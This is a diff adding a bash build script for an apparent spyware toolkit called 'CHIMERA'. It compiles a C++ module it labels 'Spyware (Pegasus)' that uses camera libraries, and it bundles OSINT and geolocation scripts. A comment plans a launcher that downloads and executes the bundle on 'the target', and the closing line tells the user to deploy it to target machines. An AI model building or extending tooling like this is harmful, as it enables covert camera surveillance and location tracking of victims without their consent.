@@ -1,0 +1,18 @@
+#!/bin/bash
+
+echo "🐉 Building CHIMERA v1.0"
+
+# 1. Compile the C++ Spyware (Pegasus)
+echo "[*] Compiling Pegasus Module..."
+g++ modules/pegasus_camera.cpp -o dist/pegasus_bin `pkg-config --cflags --libs opencv4`
+
+# 2. Bundle the Python OSINT (Sherlock/Geo)
+echo "[*] Bundling Python Modules..."
+cp modules/sherlock_intel.py dist/
+cp modules/fing_geospy.sh dist/
+
+# 3. Create the Launcher (Ghost)
+# This would be a script that downloads and executes the above on the target.
+
+echo "[+] CHIMERA BUILD COMPLETE"
+echo "    Deploy the 'dist' folder to target machines."
